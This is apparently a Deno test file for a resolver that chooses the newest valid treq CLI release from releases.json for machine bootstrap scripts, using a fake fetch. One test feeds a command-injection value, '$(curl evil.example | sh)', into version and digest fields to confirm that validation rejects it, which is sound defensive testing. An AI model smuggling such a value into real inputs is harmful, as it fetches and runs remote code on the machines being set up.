// Which treq CLI release a machine bootstraps: the newest published release
// in treq.dev/releases.json with both Linux CLI assets. No network: fetch is
// a fake.

import { assert, assertEquals, assertRejects, assertStringIncludes } from "https://deno.land/std@0.224.0/assert/mod.ts";
import { bootstrapScript, CURRENT_MANIFEST_VERSION } from "../_shared/remote/boot-manifest.ts";
import { createTreqReleaseResolver } from "../_shared/remote/treq-release.ts";
import { runBootManifest } from "../_shared/remote/machine-setup.ts";
import { ProviderError } from "../_shared/remote/provider.ts";
import { defined, fakeProvider } from "./helpers/remote_fakes.ts";

const X86 = "5d01af2aa81372a3e61cfb4b291393e6fb89f990554b162ba7cced241e1a04f3";
const ARM = "3931e7f99caea1684d40d087369137040be5ab517a73830025195dfd7f11c87a";

function cliAssets(v: string, arches = ["x86_64", "aarch64"]) {
  return Object.fromEntries(arches.map((arch) => [`linux-${arch}`, {
    url: `https://github.com/tznc/treq/releases/download/v${v}/treq-cli-${v}-linux-${arch}.tar.gz`,
    sha256: arch === "x86_64" ? X86 : ARM,
  }]));
}

/** One entry of treq.dev/releases.json (schema 1). */
function release(tag: string, opts: { prerelease?: boolean; assets?: unknown; version?: string } = {}) {
  const version = opts.version ?? tag.replace(/^v/, "");
  return {
    version,
    tag,
    published_at: "2026-10-21T19:34:12Z",
    prerelease: opts.prerelease ?? false,
    assets: opts.assets ?? cliAssets(version),
  };
}

/** A list of entries is wrapped in a schema 1 document; anything else is answered as is. */
function fakeFetch(answer: unknown[] | Record<string, unknown> | Response | Error) {
  const urls: string[] = [];
  const fetch = ((input: string | URL | Request) => {
    urls.push(String(input));
    if (answer instanceof Error) return Promise.reject(answer);
    if (answer instanceof Response) return Promise.resolve(answer.clone());
    const doc = Array.isArray(answer) ? { schema: 1, generated_at: "2026-11-15T00:00:00Z", releases: answer } : answer;
    return Promise.resolve(Response.json(doc));
  }) as typeof globalThis.fetch;
  return { fetch, urls };
}

const resolverFor = (answer: Parameters<typeof fakeFetch>[0]) =>
  createTreqReleaseResolver({ fetch: fakeFetch(answer).fetch, now: () => 0 });

Deno.test("the newest published release wins, by semver", async () => {
  const resolve = resolverFor([release("v0.2.0"), release("v0.10.0"), release("v0.9.0")]);
  const r = await resolve();
  assertEquals(r.version, "0.10.0");
  assertEquals(r, { version: "0.10.0", sha256: { x86_64: X86, aarch64: ARM } });
});

Deno.test("a version, tag or digest that fails its pattern is skipped before it reaches the script", async () => {
  const evil = "$(curl evil.example | sh)";
  const r = await resolverFor([
    release("v0.9.0", { version: `0.9.0";${evil};"` }),
    release("v0.8.0", { version: "0.8.0" + "\n" }),
    release("v0.7.1", { version: "0.7.0" }),
    release("v0.7.0", { assets: { ...cliAssets("0.7.0"), "linux-aarch64": { url: "x", sha256: evil } } }),
    release("v0.6.0", { assets: { ...cliAssets("0.6.0"), "linux-x86_64": { url: "x", sha256: X86.toUpperCase() } } }),
    release("v0.5.0", { assets: "not an object" }),
    "not an entry",
    null,
    release("v0.3.0"),
  ])();
  assertEquals(r, { version: "0.3.0", sha256: { x86_64: X86, aarch64: ARM } });
});

Deno.test("a prerelease and the nightly are skipped", async () => {
  const r = await resolverFor([
    release("nightly", { prerelease: true, assets: [] }),
    release("v0.5.0-rc.1", { prerelease: true }),
    release("v0.3.0"),
  ])();
  assertEquals(r.version, "0.3.0");
});

Deno.test("a release missing a Linux CLI asset or its digest falls back to the previous one", async () => {
  const noDigest = { ...cliAssets("0.4.1"), "linux-x86_64": { url: "x", sha256: null } };
  const r = await resolverFor([
    release("v0.4.1", { assets: noDigest }),
    release("v0.4.0", { assets: cliAssets("0.4.0", ["x86_64"]) }),
    release("v0.3.0"),
  ])();
  assertEquals(r.version, "0.3.0");
});

Deno.test("an unreachable or malformed releases.json throws a ProviderError", async () => {
  const malformed = [
    {},
    { schema: 2, releases: [release("v0.3.0")] },
    { schema: 1, releases: { "0": release("v0.3.0") } },
    new Response("<html>not json</html>", { status: 200 }),
  ];
  for (const answer of [new Error("network down"), new Response("gone", { status: 404 }), [], ...malformed]) {
    const err = await assertRejects(() => resolverFor(answer)(), ProviderError);
    assertEquals(err.kind, "unavailable");
    assertStringIncludes(err.message, "treq");
  }
});

Deno.test("the resolved release is cached for about ten minutes", async () => {
  const { fetch, urls } = fakeFetch([release("v0.3.0")]);
  let t = 0;
  const resolve = createTreqReleaseResolver({ fetch, now: () => t });
  await resolve();
  t = 9 * 60_000;
  await resolve();
  assertEquals(urls.length, 1);
  t = 11 * 60_000;
  await resolve();
  assertEquals(urls.length, 2);
  assertEquals(urls[0], "https://treq.dev/releases.json");
});

Deno.test("TREQ_RELEASES_URL overrides where releases.json is read from", async () => {
  const { fetch, urls } = fakeFetch([release("v0.3.0")]);
  const env = (key: string) => key === "TREQ_RELEASES_URL" ? "https://preview.example/releases.json" : undefined;
  await createTreqReleaseResolver({ fetch, env })();
  assertEquals(urls, ["https://preview.example/releases.json"]);
});

Deno.test("the bootstrap script carries the resolved version and digests, no placeholder", async () => {
  const execs: string[][] = [];
  const provider = fakeProvider({
    execOnMachine: (_id, cmd) => {
      execs.push(cmd);
      return Promise.resolve({ exitCode: 0, stdout: "", stderr: "" });
    },
  });
  await runBootManifest(provider, "m1", "bootstrap", resolverFor([release("v0.4.0", { prerelease: true }), release("v0.3.0")]));
  const script = defined(execs[0]?.[2]);
  assertStringIncludes(script, 'TREQ_VERSION="0.3.0"');
  assertStringIncludes(script, `TREQ_SHA256_X86_64="${X86}"`);
  assertStringIncludes(script, `TREQ_SHA256_AARCH64="${ARM}"`);
  assert(!/="PLACEHOLDER/.test(script), "no placeholder digest");
  // Without a resolved release the script fails closed at the digest check.
  assertStringIncludes(bootstrapScript(CURRENT_MANIFEST_VERSION), 'TREQ_SHA256_X86_64="PLACEHOLDER');
});
